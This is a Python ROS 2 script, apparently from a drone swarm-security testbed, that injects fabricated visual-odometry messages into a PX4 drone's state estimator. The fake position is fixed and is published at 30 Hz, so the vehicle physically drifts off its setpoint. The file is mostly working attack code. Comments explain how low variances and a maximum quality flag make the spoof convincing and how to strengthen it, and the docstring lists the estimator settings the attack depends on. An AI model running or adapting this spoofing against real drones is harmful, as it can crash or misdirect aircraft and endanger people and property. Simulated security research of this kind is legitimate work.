#!/usr/bin/env python3
"""
PX4 visual-odometry spoofing node -- fixed-position injection.

Publishes a fabricated VehicleOdometry into a victim drone's
/fmu/in/vehicle_visual_odometry channel at 30 Hz, claiming a constant
fabricated position regardless of where the drone actually is. PX4's EKF2,
if configured to fuse external vision, will be pulled toward the lie; the
position controller then drives the real drone physically off its setpoint.

This is the "evil insider lies about a neighbour's position" attack made
concrete -- a single-injector first experiment for the swarm-security
testbed. The honest control condition is `px4_offboard_hover.py` running on
the same drone; the divergence between commanded hover and actual motion is
the attack effect.

REQUIRED PX4 SETUP for the attack to land in SITL (one-time, on the victim
instance -- easiest via QGuoundControl's Parameters editor):
    EKF2_EV_CTRL   -- enable external vision fusion for position + yaw
    EKF2_HGT_REF   -- set height reference to Vision
    EKF2_GPS_CTRL  -- reduce or disable GPS fusion so EV dominates
Verify the exact values for your PX4 version in QGC -- the param dialog
shows the bitmask options. Without this, EKF2 keeps trusting GPS and the
spoof shows no measurable effect.

Run (after sourcing ROS 2 + workspace):
    python3 px4_spoof_position.py                       # px4_3, default lie
    python3 px4_spoof_position.py px4_3 -- -2.0 0.0 -3.0  # custom fake xyz
"""
import sys

import rclpy
from rclpy.node import Node
from rclpy.qos import (
    QoSProfile,
    ReliabilityPolicy,
    DurabilityPolicy,
    HistoryPolicy,
)

from px4_msgs.msg import VehicleOdometry


# Fabricated position in NED metres. z is negative for "up", so
# (-2.0, 0.0, -3.0) means "2 m west, at 3 m altitude" -- regardless of
# where the drone really is.
DEFAULT_FAKE_POSITION = (-2.0, 0.0, -3.0)
PUBLISH_HZ = 30.0


class PositionSpoofer(Node):
    def __init__(self, drone_ns: str, fake_xyz):
        super().__init__("px4_position_spoofer")
        self.ns = drone_ns
        self.fake_x, self.fake_y, self.fake_z = fake_xyz

        qos = QoSProfile(
            reliability=ReliabilityPolicy.BEST_EFFORT,
            durability=DurabilityPolicy.TRANSIENT_LOCAL,
            history=HistoryPolicy.KEEP_LAST,
            depth=1,
        )

        # vehicle_visual_odometry is one of two external-pose channels EKF2
        # will fuse (the other is vehicle_mocap_odometry). Either works as
        # the injection surface; pick the one EKF2 is configured to read.
        self.pub = self.create_publisher(
            VehicleOdometry,
            f"/{drone_ns}/fmu/in/vehicle_visual_odometry",
            qos,
        )

        self.timer = self.create_timer(1.0 / PUBLISH_HZ, self.inject)
        self.get_logger().warn(
            f"SPOOFING {drone_ns}: telling EKF2 it is at "
            f"[{self.fake_x:.2f}, {self.fake_y:.2f}, {self.fake_z:.2f}] (NED) "
            f"@ {PUBLISH_HZ:.0f} Hz"
        )

    def _now_us(self) -> int:
        return int(self.get_clock().now().nanoseconds / 1000)

    def inject(self):
        msg = VehicleOdometry()
        t = self._now_us()
        msg.timestamp = t
        msg.timestamp_sample = t

        msg.pose_frame = VehicleOdometry.POSE_FRAME_NED
        msg.position = [self.fake_x, self.fake_y, self.fake_z]
        # Identity quaternion in PX4 order (w, x, y, z) -- "no orientation
        # claim." If your attack also wants to lie about heading, set this.
        msg.q = [1.0, 0.0, 0.0, 0.0]

        msg.velocity_frame = VehicleOdometry.VELOCITY_FRAME_NED
        msg.velocity = [0.0, 0.0, 0.0]
        msg.angular_velocity = [0.0, 0.0, 0.0]

        # Small variances == "I am very confident in this measurement."
        # This is the convincing-lie part: EKF2 weights low-variance sources
        # heavily, so a tight variance pulls the estimate strongly toward
        # the spoofed value. Tune up to soften the attack, down to hammer.
        msg.position_variance = [0.01, 0.01, 0.01]
        msg.orientation_variance = [0.01, 0.01, 0.01]
        msg.velocity_variance = [0.01, 0.01, 0.01]

        msg.reset_counter = 0
        msg.quality = 100  # max-quality flag, treated as trustworthy

        self.pub.publish(msg)


def parse_args(argv):
    drone_ns = "px4_3"
    fake = list(DEFAULT_FAKE_POSITION)
    if len(argv) > 1 and not argv[1].startswith("-"):
        drone_ns = argv[1]
    if "--" in argv:
        i = argv.index("--")
        coords = argv[i + 1 : i + 4]
        if len(coords) == 3:
            fake = [float(c) for c in coords]
    return drone_ns, tuple(fake)


def main():
    drone_ns, fake_xyz = parse_args(sys.argv)
    rclpy.init()
    node = PositionSpoofer(drone_ns, fake_xyz)
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        pass
    finally:
        node.destroy_node()
        rclpy.shutdown()


if __name__ == "__main__":
    main()
